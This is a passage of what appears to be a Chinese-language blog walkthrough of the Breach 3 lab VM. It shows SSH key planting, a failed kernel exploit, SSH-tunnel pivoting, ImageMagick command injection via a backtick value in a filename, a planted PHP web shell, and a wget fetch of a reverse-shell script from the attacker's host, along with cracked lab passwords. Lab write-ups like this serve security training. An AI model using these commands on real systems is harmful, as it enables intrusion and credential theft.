</span>.bashrc<br>drwx------<span class="hljs-number"> 2 </span>thebobs thebobs<span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 10 </span><span class="hljs-number"> 2016 </span>.cache<br>-rw-r--r--<span class="hljs-number"> 1 </span>thebobs thebobs <span class="hljs-number"> 675 </span>Apr <span class="hljs-number"> 8 </span><span class="hljs-number"> 2014 </span>.profile<br>drwxrwxrwx<span class="hljs-number"> 2 </span>thebobs thebobs<span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.ssh<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs <span class="hljs-number"> 594 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.viminfo<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs  <span class="hljs-number"> 28 </span>Sep<span class="hljs-number"> 29 </span><span class="hljs-number"> 2016 </span>flag1<br></code></pre></td></tr></table></figure>
+
+<p>这些东西 注意到 那个.ssh目录是777权限  </p>
+<p>也就是说别人也可以编辑这个目录里面的东西  </p>
+<p>详细看看里面  </p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">total 68<br>drwxrwxrwx<span class="hljs-number"> 2 </span>thebobs thebobs <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.<br>drwxr-xr-x<span class="hljs-number"> 4 </span>thebobs thebobs <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>..<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs<span class="hljs-number"> 12288 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.swm<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs<span class="hljs-number"> 12288 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.swn<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs<span class="hljs-number"> 12288 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.swo<br>-rw-------<span class="hljs-number"> 1 </span>thebobs thebobs<span class="hljs-number"> 12288 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>.swp<br>-rwxrwxrwx<span class="hljs-number"> 1 </span>thebobs thebobs    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2016 </span>authorized_keys<br>-rwxrwxrwx<span class="hljs-number"> 1 </span>thebobs thebobs <span class="hljs-number"> 1679 </span>Sep<span class="hljs-number"> 10 </span><span class="hljs-number"> 2016 </span>id_rsa<br>-rwxrwxrwx<span class="hljs-number"> 1 </span>thebobs thebobs  <span class="hljs-number"> 403 </span>Sep<span class="hljs-number"> 10 </span><span class="hljs-number"> 2016 </span>id_rsa.pub<br>-rwxrwxrwx<span class="hljs-number"> 1 </span>thebobs thebobs  <span class="hljs-number"> 222 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2016 </span>known_hosts<br><br></code></pre></td></tr></table></figure>
+
+<p>有公钥和私钥文件 看看能不能直接登录  </p>
+<p>查看私钥文件也就是id_rsa 将其复制下来 保存到本地为ssh 同时赋予其700权限  </p>
+<p>将公钥文件也就是id_rsa.pub 写入那个authorized_keys里面  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/home/</span>thebobs<span class="hljs-regexp">/.ssh/i</span>d_rsa.pub &gt; <span class="hljs-regexp">/home/</span>thebobs<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p>同时赋予这个文件600权限  </p>
+<p>说到权限 随便看一眼当前用户可以sudo免密执行的指令  </p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">User</span> <span class="hljs-title">samir</span> may run the following commands on Initech-DMZ01:<br>    (thebobs) NOPASSWD: /bin/chmod<br></code></pre></td></tr></table></figure>
+
+<p>结果可以执行chmod  </p>
+<hr>
+<p>完成上面的步骤后 尝试ssh登录  </p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> thebobs@<span class="hljs-number">192.168.206.144</span> -i ssh <br></code></pre></td></tr></table></figure>
+
+<p>会出现这个报错  </p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">sign_and_send_pubkey:</span> <span class="hljs-literal">no</span> <span class="hljs-string">mutual</span> <span class="hljs-string">signature</span> <span class="hljs-string">supported</span><br></code></pre></td></tr></table></figure>
+
+<p>一个临时的解决办法是这样修改命令  </p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> thebobs@<span class="hljs-number">192.168.206.144</span> -i ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa<br></code></pre></td></tr></table></figure>
+
+<p>不过还是登不上…不知道啥原因  </p>
+<p>  <img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453962.png" srcset="/img/loading.gif" lazyload alt="1732463587024"></p>
+<p>那么只好自己在攻击机上生成一对公私钥 然后将公钥传上去 然后再重新登录  </p>
+<p>还是不行…  </p>
+<p>查看一番后发现  </p>
+<p><strong>踩坑了…</strong>  </p>
+<p>1.那两个权限似乎必须是600和700  </p>
+<p>2.传公钥上去时不能直接在浏览器的地址栏 echo “公钥” &gt; authorized_keys  </p>
+<p>因为公钥文件里面的原本该是+号的 被浏览器解析为了空格…可以base64加密一下 再echo进去 然后在解密出来  </p>
+<p> 靶机被我玩坏了 重新部署了一下靶机 现在的ip变成了192.168.206.145  </p>
+<hr>
+<p>按照上面的方法  </p>
+<p>写公钥到靶机  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEWDBZQnRPbzdobkVndWtSYjBuK2VuQWQ1Rml0U0MvOTd2bTdsTlNkc1E4YkhEeUZiZEpOTnJvUDNaMTRGV2JhL0pJN21oU2ljQkQ4VXpCT3JCSHdPaGxmSHdzTHNONXlLVnJ1eEp4ZXlNUzRQTjltNmd5QjRnRFlmbkllTjMwTWZEbVNNUHdpbnpKU0V3dVlCdE1vem9DU3lMdjhNZFBGc1lTU3pseXRONTNjb21VcURNa09xS1BzbTRzM2lObmNld253ZFpUU0F6cTBHL1ZXUTVPa0JydURWdndUSEZiUVpaOW5HdkRDamVEc0I5TTFwazJzdk1lQ1psNCt5S0NUb1pVOTB0Qi9oVzZoNmZZRHhYM1pRWDhZYXkzaGdXZmdkd2prZG0wcEFZa05zUkNNQ3pxbWozNVozY0FYbm5MRWZoVm92OE9CQmpaZWI5K1ZEeU94VnYgcm9vdEBuZXdrYWxp&quot;</span> | <span class="hljs-built_in">base64</span> -d &gt; /home/thebobs/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p>  分别给权限  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u thebobs <span class="hljs-built_in">chmod</span> 700 /home/thebobs/.ssh/<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u thebobs <span class="hljs-built_in">chmod</span> 600 /home/thebobs/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p>最终成功登录  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453069.png" srcset="/img/loading.gif" lazyload alt="1732534325742"></p>
+<p>登录发现当前的shell是python形式的 输入 <strong>import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)</strong> 去获得交互式的shell  </p>
+<p>获得完之后 当前的目录下就有flag1 直接读取  </p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">breach<span class="hljs-number">3</span>&#123;the<span class="hljs-number">_</span>dmz<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>burning&#125; <br></code></pre></td></tr></table></figure>
+
+<p>同时 在翻找文件的过程中 发现了数据库的连接方式 是免密连接  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453128.png" srcset="/img/loading.gif" lazyload alt="1732541736973"></p>
+<p>在里面还发现了blumbergh的密码  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453165.png" srcset="/img/loading.gif" lazyload alt="1732541827972"></p>
+<p>密码经过了5次base64解码之后得到  </p>
+<p>C0ff33stainS</p>
+<p>然后就是找剩下的两个flag 尝试通过find和grep命令来找  </p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ flag* 或者 grep -rl flag /</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>  <br></code></pre></td></tr></table></figure>
+
+<p>都没有找到  </p>
+<p>那么先尝试提权吧 </p>
+<p>使用 uname -a 查看内核版本   </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Linux</span> Initech-DMZ01 <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">45</span>-generic #<span class="hljs-number">66</span>~<span class="hljs-number">14</span>.<span class="hljs-number">04</span>.<span class="hljs-number">1</span>-Ubuntu SMP Wed Oct <span class="hljs-number">19</span> <span class="hljs-number">15</span>:<span class="hljs-number">05</span>:<span class="hljs-number">38</span> UTC <span class="hljs-number">2016</span> x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure>
+
+<p>发现能内核提权  </p>
+<p>搜索一下能利用的脚本  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453594.png" srcset="/img/loading.gif" lazyload alt="1732535973700"></p>
+<p>尝试用这个提权  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Linux</span> Kernel &lt; <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">83</span> / &lt; <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">58</span> (Ubuntu <span class="hljs-number">14</span>.<span class="hljs-number">04</span>/<span class="hljs-number">16</span>.<span class="hljs-number">04</span>) - Local Privilege Escalation (KASLR / SMEP)          | linux/local/<span class="hljs-number">43418</span>.c<br></code></pre></td></tr></table></figure>
+
+<p>下载并且编译43418.c  </p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">gcc  <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>local/<span class="hljs-number">43418</span>.c -<span class="hljs-keyword">static</span>  -o <span class="hljs-number">43418</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用老办法 base64加密过去 然后再解密 然后给权限 运行  </p>
+<p>但是失败了??  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453618.png" srcset="/img/loading.gif" lazyload alt="1732540024971"></p>
+<p>之后换了好多的payload都是失败 但是我看视频用的也是这个payload就能成功…  </p>
+<p>看看能不能使用别的方法提权  </p>
+<p>用同样的方法上传一个脚本文件上去自动搜集信息  </p>
+<p>地址是  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.github.com<span class="hljs-regexp">/peass-ng/</span>PEASS-ng<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/20241101-6f46e855/</span>linpeas.sh<br></code></pre></td></tr></table></figure>
+
+<p>发现能脏牛提权  </p>
+<p>结果尝试了还是失败…</p>
+<hr>
+<p>通过查看当前网络配置信息  </p>
+<p>发现还有一个虚拟机在里面 网段是 192.168.122.0 这个网段  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">virbr0</span>    Link encap:Ethernet  HWaddr fe:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">4</span>b:<span class="hljs-number">73</span>:<span class="hljs-number">5</span>f  <br>          <span class="hljs-attribute">inet</span> addr:<span class="hljs-number">192.168.122.1</span>  Bcast:<span class="hljs-number">192.168.122.255</span>  Mask:<span class="hljs-number">255.255.255.0</span><br>          <span class="hljs-attribute">UP</span> BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          <span class="hljs-attribute">RX</span> packets:<span class="hljs-number">963</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">TX</span> packets:<span class="hljs-number">556</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">collisions</span>:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          <span class="hljs-attribute">RX</span> bytes:<span class="hljs-number">58984</span> (<span class="hljs-number">58</span>.<span class="hljs-number">9</span> KB)  TX bytes:<span class="hljs-number">47230</span> (<span class="hljs-number">47</span>.<span class="hljs-number">2</span> KB)<br></code></pre></td></tr></table></figure>
+
+<p><code>virbr0</code>通常是一个由libvirt（用于管理虚拟化技术的库和工具）创建的虚拟网络桥接设备，用于KVM、QEMU或其他虚拟化解决方案中的虚拟机网络连接。  </p>
+<ul>
+<li><strong>KVM（Kernel-based Virtual Machine）</strong>：这是Linux上的一个开源的硬件虚拟化解决方案，它允许你创建和运行多个隔离的虚拟机环境。KVM自身只提供CPU和内存的虚拟化，但通常与QEMU等工具一起使用以提供更完整的虚拟化功能。</li>
+<li><strong>QEMU</strong>：这是一个通用的开源机器模拟器和虚拟化器，它可以模拟整个系统，包括硬件。QEMU可以独立使用，也可以与KVM一起使用来加速虚拟机的性能。</li>
+<li><strong>虚拟化解决方案</strong>：这指的是允许在一台物理服务器上运行多个隔离虚拟操作系统的技术。除了KVM和QEMU，还有其他如VMware、Xen、VirtualBox等。</li>
+</ul>
+<hr>
+<p>在这个靶机上还发现了nmap工具 或许是背景故事里面的黑客入侵留下的  </p>
+<p>当然 如果没有nmap的话 也可以运行以下命令来进行主机发现  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in $(seq <span class="hljs-number">2</span> <span class="hljs-number">254</span>); do ping -c <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.$i -W <span class="hljs-number">1</span>| grep <span class="hljs-string">&quot;bytes from &quot;</span>; done<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453763.png" srcset="/img/loading.gif" lazyload alt="1732540980856"></p>
+<p>如图 发现了两个虚拟机  </p>
+<p>对其进行端口扫描  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453911.png" srcset="/img/loading.gif" lazyload alt="1732544469652"></p>
+<p>开放如下几个端口 但是我的攻击机不能直接访问这些端口 尝试使用ssh隧道转发出来  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> thebobs@<span class="hljs-number">192.168.206.145</span> -i ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -L <span class="hljs-number">4455</span>:<span class="hljs-number">192.168.122.65:80</span><br></code></pre></td></tr></table></figure>
+
+<p>使用这个命令 将192.168.122.65的80端口 通过192.168.206.145这台跳板机 转发到我本地的4455端口  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453881.png" srcset="/img/loading.gif" lazyload alt="1732544680791"></p>
+<p>如图所示 转发成功  </p>
+<p>点进那个pdf converter这个页面里面去  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453068.png" srcset="/img/loading.gif" lazyload alt="1732552573453"></p>
+<p>里面有pdf convert upload这样的字眼  </p>
+<p>猜测使用了ImageMagick(跟着视频才知道的…)  </p>
+<p>ImageMagick 是一个非常强大的图像处理库，广泛用于Web服务中处理图像。然而，它也曾经因为安全漏洞而闻名，特别是那些可能导致远程代码执行（RCE）的漏洞。  </p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//imagetragick.com/</span><br></code></pre></td></tr></table></figure>
+
+<p>可以在上面的链接里面找到一下关于这个东西的漏洞利用方式  </p>
+<p>经过测试 发现类似于这样的格式  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453162.png" srcset="/img/loading.gif" lazyload alt="1732553717524"></p>
+<p>重新构造为  </p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">convert <span class="hljs-string">&quot;pdfconverter.php.pdf | `sleep 5` &quot;</span> <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure>
+
+<p>就能执行sleep 5 的指令  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453392.png" srcset="/img/loading.gif" lazyload alt="1732554296281"></p>
+<p>但是换成类似于pwd这样的指令又看不出来成功执行了 但是通过sleep能看出来可以</p>
+<p>可以自己测试一下 确实是能成功执行  </p>
+<p>回到靶机上面 在这里插入 同样是看不见pwd命令执行的效果 但是能sleep几秒之后页面才响应 可以判断出命令是被正常执行了  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453449.png" srcset="/img/loading.gif" lazyload alt="c02973f7dc6565e161215bfcfb1a2e7d"></p>
+<p>可以利用这里写个马进去 方便执行命令  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453457.png" srcset="/img/loading.gif" lazyload alt="1732596076787"></p>
+<p>路径根据之前上传的文件很容易能猜出来 就是  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:5566</span>/intranet/<span class="hljs-number">6</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>如图所示 成功执行命令</p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453505.png" srcset="/img/loading.gif" lazyload alt="1732596200133"></p>
+<p>接下来看看能不能出网 这个环境里面是有wget的 但是没有curl  </p>
+<p> <img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453581.png" srcset="/img/loading.gif" lazyload alt="1732596743401"></p>
+<p>如图所示 收到了回信 代表这台机器是可以进行出网的  </p>
+<p>既然有命令执行的点 又可以出网 尝试反弹shell  </p>
+<p>测试下来 当前环境是有nc的 使用nc反弹shell  </p>
+<p> 但是连接上马上就断开了  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453718.png" srcset="/img/loading.gif" lazyload alt="1732597130175"></p>
+<p> 换一种方式 使用bash反弹shell  </p>
+<p>不过这里又有坑  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453953.png" srcset="/img/loading.gif" lazyload alt="1732597234573"></p>
+<p>像bash这种反弹shell的形式 payload里面是有 <strong>&amp;</strong> 这个符号的 在url里面被视为参数的间隔符 所以说得给他url编码一下  </p>
+<p>还是不行???  </p>
+<p>再换  </p>
+<p>因为这个环境能执行wget 尝试在本地写一个能反弹shell的php文件 再起一个http服务器 让靶机来下载 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:1234</span>/intranet/<span class="hljs-number">6</span>.php?<span class="hljs-number">0</span>=wget%<span class="hljs-number">20</span>http://<span class="hljs-number">192.168.206.132:9966</span>/shell2.php<br></code></pre></td></tr></table></figure>
+
+<p>同时靶机上也有php环境 让他执行就好了  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:1234</span>/intranet/<span class="hljs-number">6</span>.php?<span class="hljs-number">0</span>=php shell2.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453057.png" srcset="/img/loading.gif" lazyload alt="1732600450811"></p>
+<p>如图 收到shell  </p>
+<p>升级一下tty  </p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>   <br></code></pre></td></tr></table></figure>
+
+<p>在&#x2F;home&#x2F;peter目录下面发现flag2  </p>
+<p>尝试读取 没有权限读取不了  </p>
+<p>先看看其他的东西  </p>
+<p>在&#x2F;home&#x2F;samir下面的.notes.txt文件里面 发现 infosecrockstar  </p>
+<p>感觉像密码  记录一下  </p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">samir:</span>infosecrockstar  <br></code></pre></td></tr></table></figure>
+
+<p>在&#x2F;var&#x2F;www&#x2F;目录下面 还发现html2目录 里面文件所有者是samir的 之前的网站是属于html目录  </p>
+<p>尝试切换用户并且去读取  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453172.png" srcset="/img/loading.gif" lazyload alt="1732618644207"></p>
+<p>但是不知道为什么切换不了用户 密码肯定是对的…  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453220.png" srcset="/img/loading.gif" lazyload alt="1732618682703"></p>
+<p>同样是上传脚本文件自动进行信息搜集  </p>
+<p>得到内核版本</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Linux</span> version <span class="hljs-number">3</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-amd64 (debian-kernel@lists.debian.org) (gcc version <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span> (Debian <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span>-<span class="hljs-number">1</span>) )<br></code></pre></td></tr></table></figure>
+
+<p>可以使用的漏洞 :   </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453324.png" srcset="/img/loading.gif" lazyload alt="1732614466720"></p>
+<p>一些权限不太对的目录  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453410.png" srcset="/img/loading.gif" lazyload alt="1732614373798"></p>
+<p>两个哈希</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">44</span> Sep <span class="hljs-number">29</span>  <span class="hljs-number">2016</span> <span class="hljs-regexp">/etc/</span>nginx/.htpasswd<br>samir:<span class="hljs-variable">$apr1</span><span class="hljs-variable">$TnnxXJtR</span><span class="hljs-variable">$IaTU8tuLNk4EyJPWI</span>.YF6.<br>-rwxr-xr-x <span class="hljs-number">1</span> samir samir <span class="hljs-number">50</span> Sep <span class="hljs-number">28</span>  <span class="hljs-number">2016</span> <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html2/</span>support/.htpasswd<br>lazyadmin:<span class="hljs-variable">$apr1</span><span class="hljs-variable">$T</span>/HawTDx<span class="hljs-variable">$Rustt4xkTc</span>.rtvGXTnpkV1<br></code></pre></td></tr></table></figure>
+
+<p>samir的哈希解密出来就是文章上面得到的密码  </p>
+<p>lazyadmin的哈希解密出来是 <code>test</code>  </p>
+<hr>
+<p>尝试了一下提权 </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453516.png" srcset="/img/loading.gif" lazyload alt="1732616254301"></p>
+<p>用的这个 但是提权失败  </p>
+<p>视频里面说peter的密码是这个 damnitfeel$goodtobeagang$ta  </p>
+<p>是在第二个靶机里面得到的…(我咋没影响..我记得当时的peter的密码不是inthesource吗…)</p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453687.png" srcset="/img/loading.gif" lazyload alt="1732616306705"></p>
+<p>直接切换用户 得到flag2  </p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">breach<span class="hljs-number">3</span>&#123;what<span class="hljs-number">_</span>secrets<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>bill<span class="hljs-number">_</span>hiding?&#125;<br></code></pre></td></tr></table></figure>
+
+<p>比尔在隐瞒什么秘密  </p>
+<p>那么flag3应该就在另一个虚拟机里面了  </p>
+<hr>
+<p>注意到在&#x2F;var&#x2F;log&#x2F;nginx这个目录下面 有两个日志文件可读 解压出来看看  </p>
+<p><strong>注意 : 又有坑</strong>  </p>
+<p>直接在这个目录下面解压是不行的 解压不出来 得cp他们到&#x2F;tmp目录下面才能解压查看  </p>
+<p>(也不是所有的文件都能被cp 至少得是-r–r–r– 这样的权限才行)</p>
+<p>因为&#x2F;tmp目录 对任何用户都是可读写的  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxrwxrwt</span>  <span class="hljs-number">8</span> root     root       <span class="hljs-number">4096</span> Nov <span class="hljs-number">26</span> <span class="hljs-number">06</span>:<span class="hljs-number">09</span> .<br></code></pre></td></tr></table></figure>
+
+<p>查看日志 发现192.168.122.28 这台机器 也就是之前主机发现到的另一台虚拟机 使用的浏览器是 Firefox&#x2F;22.0 </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453785.png" srcset="/img/loading.gif" lazyload alt="1732631670096"></p>
+<p>这个版本是有漏洞的  </p>
+<p>先放在一边 回头去看另一个端口 上述的一切都是80端口的 还有一个8800端口还没看 这个8800端口其实也就是上面说到的html2这个目录下面的东西  </p>
+<p>利用相同的办法 ssh隧道转发  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> thebobs@<span class="hljs-number">192.168.206.145</span> -i ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -L <span class="hljs-number">1212</span>:<span class="hljs-number">192.168.122.65:8800</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453850.png" srcset="/img/loading.gif" lazyload alt="1732632414358"></p>
+<p>成功转发 不过需要登录 尝试过后是samir:infosecrockstar 这一对  </p>
+<p>进去之后是这样  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453163.png" srcset="/img/loading.gif" lazyload alt="1732632702336"></p>
+<p>抓包看看随便提交数据看看  </p>
+<p>联想到系列中的上一个靶机 猜测有xss 最终在这个页面翻到提交的数据 (这个页面直接在那个html2的目录下面能翻到)</p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453191.png" srcset="/img/loading.gif" lazyload alt="1732635698617"></p>
+<p>回到上面的那个浏览器的漏洞  </p>
